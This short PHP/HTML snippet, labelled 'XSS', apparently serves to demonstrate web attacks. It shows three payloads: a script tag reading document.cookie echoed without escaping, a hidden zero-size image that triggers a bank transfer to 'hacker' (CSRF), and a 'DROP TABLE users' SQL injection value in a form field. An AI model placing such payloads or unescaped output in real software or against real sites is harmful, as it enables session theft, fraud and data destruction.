<!-- XSS -->
<?php
  $title = "<script>alert (document.cookie) </script>";
  echo "<h1>$title</h1>";
?>

<img src="https://bank.com/transfer?to=hacker&amount=10000" height="0" width="0">

<form action="/submit" method="post">
  <label>NAME:</label>
  <input type="text" name="name" value="user); DROP TABLE users;">
</form>